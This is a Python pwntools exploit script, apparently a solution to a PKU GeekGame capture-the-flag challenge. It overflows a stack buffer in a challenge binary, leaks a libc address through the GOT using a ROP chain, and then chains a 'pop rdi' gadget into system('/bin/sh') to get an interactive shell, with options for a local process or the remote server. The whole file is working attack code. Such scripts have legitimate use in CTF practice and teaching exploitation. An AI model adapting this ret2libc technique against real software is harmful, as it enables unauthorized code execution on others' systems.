#!/usr/bin/env python

import pwn as p

import subprocess

local = True
p.context.log_level = "debug"
# Supply your token
#token = ""

#token = p.os.environ.get("PKU_GEEK_GAME_TOKEN", token)

binary = p.ELF("./pwn")
p.context.binary = binary
if local:
    connection = p.process("./pwn")
    libc = p.ELF("/usr/lib/libc.so.6")
else:
    connection = p.remote("prob05.geekgame.pku.edu.cn", 10005)
    connection.recvuntil(b"Please input your token:")
    connection.sendline(token.encode())
    libc = p.ELF("./libc-2.31.so")
connection.recvuntil("PWN it!\n")
connection.sendline("-1")

popRdiRetOpcodes = int(subprocess.run(["radare2", "-q", "-c", "/R pop rdi", "pwn"], capture_output=True, check=True).stdout.split()[0], base=16)

payload = b"X" * (0x80 + 8) + p.p64(popRdiRetOpcodes) + p.p64(
    binary.got["__isoc99_scanf"]) + p.p64(binary.plt["puts"]) + p.p64(binary.symbols["main"])
connection.sendline(payload)

libc.address = p.u64(connection.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - libc.symbols["__isoc99_scanf"]

p.log.info("libc.address: " + hex(libc.address))

connection.recvuntil("PWN it!\n")
connection.sendline("-1")

if local:
    oneGadget = libc.address + 0xccc1d
    shell = p.p64(next(libc.search(b"/bin/sh")))
    system = p.p64(libc.symbols["system"] - 1)
    stackAlignment = p.p64(popRdiRetOpcodes + 1)
    payload = b"X" * (0x80 + 8) + p.p64(popRdiRetOpcodes) + shell + system
else:
    oneGadget = libc.address + 0xe6c84 - 1
    shell = p.p64(next(libc.search(b"/bin/sh")))
    system = p.p64(libc.symbols["system"] - 1)
    stackAlignment = p.p64(popRdiRetOpcodes + 1)
    payload = b"X" * (0x80 + 8) + p.p64(popRdiRetOpcodes) + shell + stackAlignment + system
p.log.info("Final payload: " + repr(payload))
connection.sendline(payload)

connection.interactive()
